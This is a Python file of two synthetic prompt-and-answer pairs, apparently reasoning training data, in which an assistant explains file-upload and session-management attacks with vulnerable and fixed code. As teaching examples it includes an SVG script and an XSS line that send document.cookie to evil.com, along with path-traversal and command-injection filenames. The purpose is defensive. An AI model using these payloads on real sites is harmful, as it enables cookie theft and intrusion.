"""Phase 2B: Advanced Reasoning — Adversarial Self-Testing (Part 10/10)"""

PAIRS = [
    (
        "thinking/adversarial-file-upload-endpoint",
        "We added a file upload feature for user profile pictures. Users upload an image, we save it to disk, and serve it back. What security issues should I check for?",
        r'''<think>
File upload security — this has a HUGE attack surface. Let me systematically enumerate the threats.

**Input validation attacks:**
1. File type bypass: attacker uploads a .php/.jsp file disguised as .jpg (changes extension, MIME type)
2. Polyglot files: file that's valid JPEG AND valid PHP (interpreted as PHP by server)
3. Oversized files: upload 10GB file to exhaust disk space
4. Zip bombs: upload a small file that expands to petabytes
5. Filename injection: filename contains `../../etc/passwd` (path traversal) or `; rm -rf /` (command injection)

**Storage attacks:**
6. Path traversal: filename `../../../etc/crontab` writes outside upload directory
7. Symlink attacks: uploaded file is a symlink to sensitive files
8. Disk exhaustion: thousands of uploads fill the disk

**Serving attacks:**
9. Stored XSS: SVG files can contain JavaScript (`<script>alert(1)</script>` inside SVG)
10. Content sniffing: browser interprets uploaded HTML as a web page (MIME sniffing)
11. SSRF via image processing: image metadata contains URLs that the server fetches
12. Image processing exploits: malformed images crash/exploit ImageMagick (ImageTragick CVE-2016-3714)

**Metadata attacks:**
13. EXIF data leakage: profile pictures contain GPS coordinates of user's home
14. Embedded malware: valid image with appended executable (polyglot)

Let me prioritize and provide concrete fixes.
</think>

File upload has one of the largest attack surfaces in web development. Here are the critical vulnerabilities.

## Critical: Path Traversal (Write Files Anywhere)

```python
# ❌ VULNERABLE: using user-provided filename directly
@app.post("/upload")
def upload_file(file: UploadFile):
    filepath = f"/uploads/{file.filename}"
    # Attacker sends filename: "../../../etc/cron.d/backdoor"
    # File is written to /etc/cron.d/backdoor → attacker has cron access!

    with open(filepath, "wb") as f:
        f.write(file.file.read())

# ✅ FIXED: never use user-provided filename
import uuid
import os

UPLOAD_DIR = "/uploads"

@app.post("/upload")
def upload_file(file: UploadFile):
    # Generate a random filename — NEVER trust user input
    ext = get_safe_extension(file.filename)
    safe_filename = f"{uuid.uuid4()}{ext}"
    filepath = os.path.join(UPLOAD_DIR, safe_filename)

    # Verify the resolved path is inside the upload directory
    real_path = os.path.realpath(filepath)
    if not real_path.startswith(os.path.realpath(UPLOAD_DIR)):
        raise HTTPException(400, "Invalid path")

    with open(filepath, "wb") as f:
        f.write(file.file.read())
    return {"filename": safe_filename}
```

## Critical: File Type Bypass (Execute Code on Server)

```python
# ❌ VULNERABLE: checking only the file extension
def is_image(filename):
    return filename.endswith(('.jpg', '.png', '.gif'))

# Attacker uploads: "shell.php.jpg" or sets Content-Type: image/jpeg
# on a PHP file. If your web server processes .php files,
# accessing /uploads/shell.php.jpg might execute PHP code!

# ✅ FIXED: validate ACTUAL file content, not just extension or MIME
import imghdr  # or python-magic

ALLOWED_TYPES = {'jpeg', 'png', 'gif', 'webp'}

def validate_image(file_bytes: bytes) -> str:
    # Check actual file content (magic bytes), not extension or MIME header
    file_type = imghdr.what(None, h=file_bytes)
    if file_type not in ALLOWED_TYPES:
        raise HTTPException(400, f"File type not allowed: {file_type}")
    return file_type

@app.post("/upload")
def upload_file(file: UploadFile):
    content = file.file.read()

    # Size check FIRST (before processing)
    if len(content) > 5 * 1024 * 1024:  # 5MB max
        raise HTTPException(400, "File too large")

    # Validate actual content type
    file_type = validate_image(content)

    # Re-encode the image to strip any embedded code
    from PIL import Image
    import io
    img = Image.open(io.BytesIO(content))
    output = io.BytesIO()
    img.save(output, format=file_type.upper())
    clean_content = output.getvalue()

    safe_filename = f"{uuid.uuid4()}.{file_type}"
    filepath = os.path.join(UPLOAD_DIR, safe_filename)
    with open(filepath, "wb") as f:
        f.write(clean_content)  # Write RE-ENCODED image, not original
```

## High: Stored XSS via SVG/HTML Upload

```python
# ❌ VULNERABLE: accepting SVG files
# SVG is XML and can contain JavaScript:
# <svg><script>document.location='evil.com?c='+document.cookie</script></svg>

# If served from your domain: XSS attack
# Accessing /uploads/evil.svg executes JavaScript in your origin

# ✅ FIXED: never serve user uploads from your main domain
# Option A: serve from a different domain (no cookie access)
#   uploads.yourcdn.com instead of yoursite.com/uploads
#
# Option B: set Content-Disposition to force download
#   Content-Disposition: attachment; filename="image.svg"
#
# Option C: don't allow SVG at all (safest)
ALLOWED_TYPES = {'jpeg', 'png', 'gif', 'webp'}  # No SVG, no HTML, no XML
```

## High: Content-Type Sniffing Attack

```python
# Attacker uploads an HTML file disguised as image.
# Browser might "sniff" the content type and render it as HTML.

# ✅ FIXED: set headers when serving uploaded files
@app.get("/uploads/{filename}")
def serve_upload(filename: str):
    filepath = os.path.join(UPLOAD_DIR, filename)
    return FileResponse(
        filepath,
        headers={
            "X-Content-Type-Options": "nosniff",          # Don't sniff!
            "Content-Security-Policy": "default-src 'none'",  # No scripts
            "Content-Disposition": "inline",
        }
    )
```

## Medium: Disk Exhaustion

```python
# ❌ VULNERABLE: no limits
@app.post("/upload")
def upload(file: UploadFile):
    content = file.file.read()  # Reads entire file into memory — OOM on large files!

# ✅ FIXED: streaming read with size limit
MAX_SIZE = 5 * 1024 * 1024  # 5MB

@app.post("/upload")
def upload(file: UploadFile):
    total = 0
    chunks = []
    while chunk := file.file.read(8192):
        total += len(chunk)
        if total > MAX_SIZE:
            raise HTTPException(413, "File too large")
        chunks.append(chunk)
    content = b"".join(chunks)

    # Also: limit uploads per user per day
    upload_count = cache.incr(f"uploads:{user_id}:{today}")
    if upload_count > 20:
        raise HTTPException(429, "Too many uploads today")
```

## Medium: EXIF Data Leakage

```python
# User uploads a photo taken with their phone.
# Photo contains EXIF metadata: GPS coordinates, device info, timestamp.
# If you serve the original file, you're leaking their location.

# ✅ FIXED: strip metadata during re-encoding
from PIL import Image
import io

def strip_metadata(image_bytes: bytes, format: str) -> bytes:
    img = Image.open(io.BytesIO(image_bytes))
    # Create a new image without metadata
    clean = Image.new(img.mode, img.size)
    clean.putdata(list(img.getdata()))
    output = io.BytesIO()
    clean.save(output, format=format)
    return output.getvalue()
```

## Complete Secure Upload Checklist

```
FILE VALIDATION:
  □ Check file content (magic bytes), not just extension
  □ Whitelist allowed types (jpeg, png, gif, webp)
  □ Reject SVG, HTML, XML, PHP, JS, and anything executable
  □ Enforce maximum file size (5-10MB for images)
  □ Re-encode images to strip embedded code and metadata

FILE STORAGE:
  □ Generate random filenames (never use user input)
  □ Verify resolved path is inside upload directory
  □ Limit uploads per user per day
  □ Store outside web root (don't let web server directly serve them)

FILE SERVING:
  □ Serve from a separate domain or CDN
  □ Set X-Content-Type-Options: nosniff
  □ Set Content-Security-Policy: default-src 'none'
  □ Consider Content-Disposition: attachment for non-image types
  □ Don't generate URLs based on user-provided filenames

INFRASTRUCTURE:
  □ Scan uploads with antivirus (ClamAV)
  □ Use a CDN/object storage (S3) instead of local disk
  □ Monitor upload directory size and growth rate
```'''
    ),
    (
        "thinking/adversarial-session-management",
        "I'm implementing session management for our web app. Users log in and get a session ID stored in a cookie. What attacks should I be worried about?",
        r'''<think>
Session management security — this is foundational web security. Let me enumerate attacks.

**Session ID attacks:**
1. Session fixation: attacker sets the session ID before user logs in
2. Session hijacking: attacker steals the session ID via XSS or network sniffing
3. Predictable session IDs: if IDs are sequential or time-based, attacker can guess them
4. Session ID in URL: leaked via Referer header, browser history, shared links

**Cookie attacks:**
5. Missing HttpOnly flag: JavaScript can read the cookie (XSS → session theft)
6. Missing Secure flag: cookie sent over HTTP (network sniffing)
7. Missing SameSite flag: CSRF attacks using the session
8. Overly broad cookie scope: cookie shared across subdomains

**Session lifecycle attacks:**
9. No expiration: session lives forever after login
10. No invalidation on logout: logout doesn't actually destroy the session
11. No re-authentication for sensitive ops: changing password doesn't require current password
12. Session not rotated on login: same session ID before and after auth

**Concurrent session attacks:**
13. No concurrent session limit: attacker uses stolen session alongside user
14. No device/IP tracking: can't detect suspicious session usage

Let me prioritize with code examples.
</think>

Session management has many attack vectors. Here are the critical ones with fixes.

## Critical: Session ID Security

```python
# ❌ VULNERABLE: predictable session IDs
import time
def create_session():
    session_id = str(int(time.time()))  # Sequential!
    # Attacker: try session IDs 1709654400, 1709654401, 1709654402...
    # They'll find valid sessions.

# ❌ VULNERABLE: weak randomness
import random
def create_session():
    session_id = str(random.randint(0, 999999))  # Only 1M possibilities
    # Brute-forceable in minutes

# ✅ FIXED: cryptographically random, sufficient length
import secrets
def create_session():
    session_id = secrets.token_urlsafe(32)  # 256 bits of entropy
    # "xK9m_2hJqLnR4vT8wB1cY0aE5fG6iH3j" — unguessable
    return session_id
```

## Critical: Cookie Configuration

```python
# ❌ VULNERABLE: default cookie settings
response.set_cookie("session_id", session_id)
# Missing: HttpOnly, Secure, SameSite, expiration

# ✅ FIXED: secure cookie settings
response.set_cookie(
    "session_id",
    session_id,
    httponly=True,        # JavaScript cannot read this cookie (prevents XSS theft)
    secure=True,          # Only sent over HTTPS (prevents network sniffing)
    samesite="lax",       # Not sent on cross-site requests (prevents CSRF)
    max_age=3600,         # Expires in 1 hour (limits window of theft)
    path="/",             # Only sent to this path
    domain=None,          # Only this exact domain (not subdomains)
)
```

```
Each flag prevents a specific attack:

  httponly=True:
    Without: <script>fetch('evil.com?c='+document.cookie)</script>
    With: JavaScript cannot access the cookie. XSS can't steal sessions.

  secure=True:
    Without: session cookie sent over HTTP → readable by anyone on the network
    With: cookie ONLY sent over HTTPS → encrypted in transit

  samesite="lax":
    Without: evil.com can include <img src="yoursite.com/delete-account">
             → browser sends your session cookie → action performed
    With: cookie not sent on cross-origin requests → CSRF blocked

  max_age=3600:
    Without: session lasts forever → stolen session works indefinitely
    With: session expires in 1 hour → limited damage window
```

## High: Session Fixation Attack

```python
# ❌ VULNERABLE: session ID doesn't change on login
@app.post("/login")
def login(username, password):
    if verify_credentials(username, password):
        # Uses the EXISTING session ID — might be attacker-controlled!
        session["user_id"] = user.id
        return {"success": True}

# Attack flow:
# 1. Attacker visits site, gets session_id=ABC
# 2. Attacker sends victim a link: yoursite.com?session_id=ABC
# 3. Victim clicks link, logs in — session ABC is now authenticated
# 4. Attacker uses session_id=ABC — they're logged in as victim!

# ✅ FIXED: regenerate session ID on login
@app.post("/login")
def login(username, password):
    if verify_credentials(username, password):
        # Destroy old session, create new one
        old_session_id = request.cookies.get("session_id")
        if old_session_id:
            session_store.delete(old_session_id)

        new_session_id = secrets.token_urlsafe(32)
        session_store.create(new_session_id, {"user_id": user.id})

        response = JSONResponse({"success": True})
        response.set_cookie("session_id", new_session_id,
                          httponly=True, secure=True, samesite="lax")
        return response
```

## High: Logout Must Actually Destroy the Session

```python
# ❌ VULNERABLE: logout only clears the cookie
@app.post("/logout")
def logout():
    response = JSONResponse({"success": True})
    response.delete_cookie("session_id")
    return response
    # Problem: if attacker copied the session ID, it STILL WORKS
    # The session is still valid on the server!

# ✅ FIXED: destroy session on server side
@app.post("/logout")
def logout():
    session_id = request.cookies.get("session_id")
    if session_id:
        session_store.delete(session_id)  # Server-side deletion!
    response = JSONResponse({"success": True})
    response.delete_cookie("session_id")
    return response
```

## Medium: Sensitive Actions Need Re-authentication

```python
# ❌ VULNERABLE: password change doesn't verify current password
@app.post("/change-password")
def change_password(new_password: str):
    user = get_current_user(request)
    user.set_password(new_password)
    # If session is stolen, attacker changes password → locks out real user

# ✅ FIXED: require current password for sensitive operations
@app.post("/change-password")
def change_password(current_password: str, new_password: str):
    user = get_current_user(request)
    if not user.verify_password(current_password):
        raise HTTPException(403, "Current password is incorrect")
    user.set_password(new_password)

    # Also: invalidate ALL other sessions (force re-login everywhere)
    session_store.delete_all_for_user(user.id)
    new_session = create_new_session(user.id)
    # Return new session cookie
```

## Session Security Checklist

```
SESSION ID:
  □ Cryptographically random (secrets.token_urlsafe(32))
  □ Regenerated on login (prevent fixation)
  □ Never in URLs (use cookies only)
  □ Sufficient entropy (128+ bits)

COOKIES:
  □ HttpOnly (prevent XSS theft)
  □ Secure (HTTPS only)
  □ SameSite=Lax or Strict (prevent CSRF)
  □ Reasonable max_age (1-24 hours)
  □ Path and domain scoped appropriately

LIFECYCLE:
  □ Expire after inactivity timeout (30-60 minutes)
  □ Absolute expiration (24 hours max)
  □ Server-side deletion on logout
  □ Invalidate all sessions on password change
  □ Re-authenticate for sensitive operations

MONITORING:
  □ Log session creation with IP and user agent
  □ Alert on concurrent sessions from different IPs/countries
  □ Rate limit login attempts per session
```'''
    ),
]

if __name__ == "__main__":
    for tag, q, a in PAIRS:
        print(f"  [{tag}] {q[:60]}...")
    print(f"\nTotal pairs in this file: {len(PAIRS)}")
